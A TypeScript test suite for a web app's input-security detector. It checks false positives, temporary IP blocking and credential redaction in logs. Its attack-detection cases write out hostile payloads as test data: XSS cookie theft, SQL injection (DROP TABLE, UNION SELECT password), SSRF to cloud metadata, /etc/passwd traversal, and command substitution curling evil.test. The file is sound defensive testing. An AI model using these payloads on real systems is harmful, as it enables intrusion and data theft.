import assert from "node:assert/strict"
import { describe, it } from "node:test"

import { detectPayload, validateSecurityField, normalizeSecurityText, riskContributionFor, MAX_SINGLE_REQUEST_RISK, type SecurityFieldKind } from "@/lib/security/input"
import {
  TEMPORARY_BLOCK_MINUTES,
  TEMPORARY_BLOCK_MS,
  TEMPORARY_BLOCK_THRESHOLD,
  RISK_WINDOW_MS,
} from "@/lib/security/risk"
import { redactSecrets, activeBlockWhere } from "@/lib/security/abuse"

function tierOf(kind: SecurityFieldKind, text: string) {
  return detectPayload(text, kind)
}

// ---------------------------------------------------------------------------
// 1-5. FALSE POSITIVES: ordinary customer input must never be an "attack".
// These are the regressions behind real customers being banned.
// ---------------------------------------------------------------------------

const FALSE_POSITIVES: Array<{ label: string; kind: SecurityFieldKind; text: string }> = [
  // A support message that mentions a link. The old rule set matched the bare
  // word "link" via \b(?:iframe|svg|link|meta|style|base)\b.
  { label: "prose containing the word link", kind: "message", text: "Please click this link to reset your password: https://zwscloud.com/reset" },
  { label: "prose containing base price", kind: "message", text: "My invoice is 1180 total. Base price 1000 plus GST 180." },
  { label: "prose containing metadata", kind: "message", text: "We need the metadata for our records.\nStyle: modern\nBase platform: Linux" },
  { label: "prose mentioning eval()", kind: "message", text: "I ran the eval() command from your docs and got an error." },
  { label: "prose mentioning setTimeout", kind: "message", text: "setTimeout seems stuck on my server, can you help?" },
  { label: "prose mentioning innerHTML", kind: "message", text: "The page uses innerHTML somewhere, not sure where." },

  // Multi-line free text. The old `header_injection` rule was /\r|\n(?=.*:)/
  // which fired on ANY newline when a colon appeared later in the string.
  { label: "multi-line support message", kind: "message", text: "Hi team,\n\nI followed the guide but it still fails.\n\nError: connection reset\nServer: 10.0.0.1" },
  { label: "multi-line address with colon", kind: "address", text: "Flat 4B\nSector 62\nGurugram, Haryana: 122001" },
  { label: "multi-line subject that is really a message", kind: "message", text: "Summary:\nStill broken" },
  { label: "two-line message, colon only on line 1", kind: "message", text: "Error: timeout\nplease advise" },

  // JSON and CSS pasted into a ticket. The old template rule matched `}}`.
  { label: "pasted JSON", kind: "message", text: 'Here is my config: {"a":{"b":1},"c":{"d":2}}' },
  { label: "pasted CSS", kind: "message", text: "Here is my CSS:\n.x { color: red; }\n.y { margin: 0; }" },
  { label: "pasted code with function()", kind: "message", text: "I ran this:\nfunction main() { console.log('hi') }" },
  { label: "template literal in pasted code", kind: "message", text: "const msg = `hello ${name}`" },

  // A truncated request body from a flaky connection - the reported symptom.
  { label: "truncated JSON body", kind: "message", text: '{"name":"test"' },
  { label: "truncated mid-sentence", kind: "message", text: "my server keeps dropping, please" },
  { label: "unicode / emoji content", kind: "message", text: "server down 🙏 please check 🙂" },
  { label: "non-latin script", kind: "name", text: "राहुल शर्मा" },
  { label: "legitimate angle-bracket placeholder", kind: "message", text: "Replace <your-ip-here> with the server IP" },
  { label: "legitimate comparison in prose", kind: "message", text: "the price is 5 < 10 so it should pass" },
  { label: "quoted SQL in a support question", kind: "message", text: "My query SELECT * FROM users fails, why?" },

  // Punctuation that the old SAFE_TEXT regex rejected outright.
  { label: "message with parentheses and quotes", kind: "message", text: "What's the status of order (INV-1001)? \"Urgent\" per my manager." },
  { label: "company name with apostrophe", kind: "company", text: "O'Brien & Sons (Pty) Ltd" },
]

describe("false positives: ordinary customer input is not an attack", () => {
  for (const { label, kind, text } of FALSE_POSITIVES) {
    it(`does not flag: ${label}`, () => {
      const detection = tierOf(kind, text)
      assert.notEqual(detection.tier, "attack", `tier was "attack" via [${detection.attackTypes.join(", ")}]`)
      assert.equal(detection.dangerous, false)
    })
  }

  it("accepts ordinary multi-line support text end to end", () => {
    const result = validateSecurityField(
      "Hi,\n\nPlease share the link to the dashboard.\nServer: 10.0.0.1\nError: timeout",
      "message",
      "Message",
    )
    assert.equal(result.ok, true, result.ok ? "" : JSON.stringify(result.detection.attackTypes))
  })

  it("treats a newline as an attack only where the grammar forbids it", () => {
    // Same bytes, different field: the context decides.
    assert.equal(detectPayload("evil\r\nX-Injected: 1", "subject").dangerous, true)
    assert.equal(detectPayload("evil\r\nX-Injected: 1", "email").dangerous, true)
    assert.equal(detectPayload("Line one\nLine two: value", "message").dangerous, false)
  })

  it("never escalates a mere formatting problem to an attack", () => {
    // Unsupported characters are a validation error, not evidence of an attack.
    const result = validateSecurityField("bad\x07value", "email", "Email")
    assert.equal(result.ok, false)
    assert.equal(result.detection.dangerous, false, "a formatting rejection must not look like an attack")
  })
})

// ---------------------------------------------------------------------------
// 11-14. REAL ATTACKS must still be caught.
// ---------------------------------------------------------------------------

const REAL_ATTACKS: Array<{ label: string; kind: SecurityFieldKind; text: string; expect: string }> = [
  { label: "script tag", kind: "message", text: "<script>alert(document.cookie)</script>", expect: "xss_script_tag" },
  { label: "img onerror", kind: "message", text: '<img src=x onerror="alert(1)">', expect: "xss_event_handler" },
  { label: "svg onload", kind: "message", text: '<svg onload=alert(1)>', expect: "xss_event_handler" },
  { label: "javascript URL", kind: "message", text: '<a href="javascript:alert(1)">click</a>', expect: "xss_script_url" },
  { label: "iframe tag", kind: "message", text: '<iframe src="http://evil.test"></iframe>', expect: "xss_dangerous_tag" },
  { label: "encoded script tag", kind: "message", text: "%3Cscript%3Ealert(1)%3C/script%3E", expect: "xss_script_tag" },
  { label: "html-entity script tag", kind: "message", text: "&lt;script&gt;alert(1)&lt;/script&gt;", expect: "xss_script_tag" },
  { label: "unicode-escaped script", kind: "message", text: "\\u003cscript\\u003ealert(1)", expect: "xss_script_tag" },

  { label: "SQL union select", kind: "search", text: "1' UNION SELECT password FROM users--", expect: "sql_injection_union" },
  { label: "SQL boolean tautology", kind: "search", text: "' OR '1'='1", expect: "sql_injection_boolean" },
  { label: "SQL drop table", kind: "search", text: "x'; DROP TABLE users;--", expect: "sql_injection_union" },
  { label: "SQL stacked query", kind: "search", text: "1; DELETE FROM accounts", expect: "sql_injection_stacked" },
  { label: "SQL sleep", kind: "search", text: "1' AND sleep(5)--", expect: "sql_injection_sleep" },

  { label: "SSRF to localhost", kind: "url", text: "http://127.0.0.1:5432/admin", expect: "ssrf_internal_target" },
  { label: "SSRF to private range", kind: "url", text: "http://192.168.1.1/router", expect: "ssrf_internal_target" },
  { label: "SSRF to cloud metadata", kind: "url", text: "http://169.254.169.254/latest/meta-data/", expect: "ssrf_cloud_metadata" },
  { label: "SSRF via gopher", kind: "url", text: "gopher://127.0.0.1:6379/_INFO", expect: "ssrf_protocol_switch" },

  { label: "path traversal", kind: "path", text: "../../../../etc/passwd", expect: "path_traversal" },
  { label: "path traversal encoded", kind: "path", text: "%2e%2e%2f%2e%2e%2fetc%2fpasswd", expect: "path_traversal_encoded" },
  { label: "path traversal windows", kind: "path", text: "..\\..\\windows\\system32", expect: "path_traversal" },

  { label: "command injection chain", kind: "message", text: "x; cat /etc/passwd", expect: "command_injection" },
  { label: "command substitution", kind: "message", text: "$(curl http://evil.test/x)", expect: "command_substitution" },

  { label: "prototype pollution", kind: "metadata", text: '{"__proto__":{"admin":true}}', expect: "prototype_pollution" },
  { label: "template injection", kind: "metadata", text: "${constructor.constructor('return process')()}", expect: "template_injection" },

  { label: "null byte truncation", kind: "path", text: "report.pdf\u0000.png", expect: "null_byte" },
  { label: "CRLF header injection in subject", kind: "subject", text: "ok\r\nSet-Cookie: admin=1", expect: "header_injection" },
  { label: "response splitting", kind: "metadata", text: "%0d%0aContent-Length: 0", expect: "response_splitting" },
]

describe("real attacks are still detected", () => {
  for (const { label, kind, text, expect } of REAL_ATTACKS) {
    it(`detects ${label}`, () => {
      const detection = detectPayload(text, kind)
      assert.equal(detection.dangerous, true, `missed; signals were [${detection.attackTypes.join(", ")}]`)
      assert.ok(
        detection.attackTypes.includes(expect),
        `expected ${expect}, got [${detection.attackTypes.join(", ")}]`,
      )
      assert.ok(detection.score > 0, "an attack must carry a non-zero risk score")
    })
  }

  it("does not confuse the word 'online' with an event handler", () => {
    // \bon[a-z]{3,20}= would have matched "online=", "once=" and friends.
    assert.equal(detectPayload("Set the online= value please", "metadata").dangerous, false)
  })

  it("treats bare markup as suspicious rather than as an attack", () => {
    const detection = detectPayload("<not-a-tag>", "message")
    assert.equal(detection.dangerous, false)
    assert.ok(detection.score > 0, "but it is still scored for the record")
  })
})

// ---------------------------------------------------------------------------
// 6-10, 18, 19. Mitigation ladder and the 30-minute temporary block.
// ---------------------------------------------------------------------------

describe("mitigation ladder", () => {
  it("uses a 30-minute window and never a permanent flag", () => {
    assert.equal(TEMPORARY_BLOCK_MINUTES, 30)
    assert.equal(TEMPORARY_BLOCK_MS, 30 * 60 * 1000)
    // Anything the risk engine writes is permanent:false with an expiry, so a
    // block from this path cannot outlive its window.
    assert.ok(TEMPORARY_BLOCK_THRESHOLD > 0)
  })

  it("keeps a single finding below the temporary-block threshold", () => {
    // Structurally guaranteed, not just empirically true today: whatever a
    // payload scores, only the capped contribution reaches the risk ledger,
    // and the cap is below the threshold.
    const worst = detectPayload('<script>alert(1)</script><img src=x onerror=alert(2)>', "message")
    assert.ok(worst.score > 0, "the attack is still fully scored in the log")
    assert.equal(riskContributionFor(worst), MAX_SINGLE_REQUEST_RISK)
    assert.ok(
      riskContributionFor(worst) < TEMPORARY_BLOCK_THRESHOLD,
      `one request contributes ${riskContributionFor(worst)} which must stay below ${TEMPORARY_BLOCK_THRESHOLD}`,
    )
  })

  it("only considers active blocks whose expiry is in the future", () => {
    const now = new Date()
    const where = activeBlockWhere(now) as any
    assert.deepEqual(where.unblockedAt, null)
    assert.equal(where.OR.length, 2)
    assert.deepEqual(where.OR[0], { permanent: true })
    assert.deepEqual(where.OR[1], { blockedUntil: { gt: now } })

    // A temporary block that expired is no longer active, which is what makes
    // the 30-minute release automatic.
    const past = new Date(now.getTime() - 1000)
    assert.equal(past.getTime() > now.getTime(), false)
  })

  it("decays risk inside a bounded window", () => {
    assert.ok(RISK_WINDOW_MS > 0 && RISK_WINDOW_MS <= 24 * 60 * 60 * 1000)
  })

  it("keeps block state in the database so a restart cannot lose or invent one", async () => {
    const { readFileSync } = await import("node:fs")
    const risk = readFileSync("lib/security/risk.ts", "utf8")
    // No in-process map holds block state; everything goes to prisma.
    assert.doesNotMatch(risk, /new Map\(/, "in-memory block state would not survive a restart")
    assert.match(risk, /securityRiskState/)
    assert.match(risk, /blockedUntil: until/)
    assert.match(risk, /permanent: false/)
  })

  it("never writes permanent:true from the automatic mitigation path", async () => {
    const { readFileSync } = await import("node:fs")
    const abuse = readFileSync("lib/security/abuse.ts", "utf8")
    const risk = readFileSync("lib/security/risk.ts", "utf8")

    // The only place `permanent` may appear in abuse.ts is the READ that keeps
    // enforcing bans an operator created by hand.
    const permanentMatches = abuse.split("\n").filter((line) => /permanent:\s*true/.test(line))
    assert.deepEqual(permanentMatches, ["      { permanent: true },"], "permanent:true may only exist in the read filter")

    // Every write path sets permanent:false with an expiry.
    assert.doesNotMatch(risk, /permanent:\s*true/)
    assert.match(risk, /permanent: false/)

    // There is no code path left that creates a blockedIp row outside risk.ts.
    const blockWrites = abuse.split("\n").filter((line) => /blockedIp\.(create|upsert|update)/.test(line))
    assert.deepEqual(blockWrites, [], "block rows must only be written by the risk engine")
  })

  it("still enforces a permanent ban an operator created by hand", async () => {
    const { readFileSync } = await import("node:fs")
    const abuse = readFileSync("lib/security/abuse.ts", "utf8")
    // Removing the read would silently un-ban every legacy row, so it must stay.
    assert.match(abuse, /\{ permanent: true \}/)
    assert.match(abuse, /blockedUntil: \{ gt: now \}/)
  })
})

// ---------------------------------------------------------------------------
// 20. No credentials in logs.
// ---------------------------------------------------------------------------

describe("security logging redacts credentials", () => {
  it("masks credential-shaped keys at any depth", () => {
    const redacted = redactSecrets({
      email: "a@b.com",
      password: "hunter2",
      token: "abc",
      authorization: "Bearer xyz",
      cookie: "sid=1",
      otp: "123456",
      apiKey: "k",
      nested: { secret: "s", sessionId: "x", keep: "visible" },
      list: [{ cvv: "123" }],
    }) as Record<string, any>

    const serialised = JSON.stringify(redacted)
    for (const leak of ["hunter2", "abc", "Bearer xyz", "sid=1", "123456"]) {
      assert.equal(serialised.includes(leak), false, `${leak} leaked into the log payload`)
    }
    assert.equal(redacted.email, "a@b.com", "non-secret fields survive")
    assert.equal(redacted.nested.keep, "visible")
  })

  it("bounds very long strings instead of storing whole payloads", () => {
    const redacted = redactSecrets({ note: "x".repeat(5000) }) as Record<string, any>
    assert.ok(redacted.note.length <= 501)
  })

  it("does not log authorization headers from the request context", async () => {
    const { readFileSync } = await import("node:fs")
    const abuse = readFileSync("lib/security/abuse.ts", "utf8")
    // The security context deliberately does not carry headers or cookies.
    const contextType = abuse.match(/export type SecurityContext = \{[\s\S]*?\}/)?.[0] || ""
    assert.doesNotMatch(contextType, /cookie|authorization|token/i)
  })
})

// ---------------------------------------------------------------------------
// Behavioural guarantees relied on by the route layer.
// ---------------------------------------------------------------------------

describe("detector contract for callers", () => {
  it("reports a tier, a score and a signal list rather than a bare boolean", () => {
    const detection = detectPayload("<script>x</script>", "message")
    assert.equal(typeof detection.tier, "string")
    assert.equal(typeof detection.score, "number")
    assert.ok(Array.isArray(detection.signals))
    assert.ok(detection.signals.every((s) => typeof s.type === "string" && typeof s.score === "number" && typeof s.evidence === "string"))
  })

  it("keeps the legacy dangerous/attackTypes fields working for existing callers", () => {
    const attack = detectPayload("<script>x</script>", "message")
    assert.equal(attack.dangerous, true)
    assert.ok(attack.attackTypes.length > 0)
    const benign = detectPayload("hello", "message")
    assert.equal(benign.dangerous, false)
    assert.deepEqual(benign.attackTypes, [])
  })

  it("defaults to the most permissive grammar when no kind is given", () => {
    // A caller that forgets to pass a kind must not accidentally opt into the
    // strict single-line rules and start banning people.
    assert.equal(detectPayload("a\nb: c", "message").dangerous, false)
  })

  it("normalises without destroying meaningful characters", () => {
    assert.equal(normalizeSecurityText("a  b"), "a b")
    assert.equal(normalizeSecurityText("line1\r\nline2"), "line1\nline2")
  })
})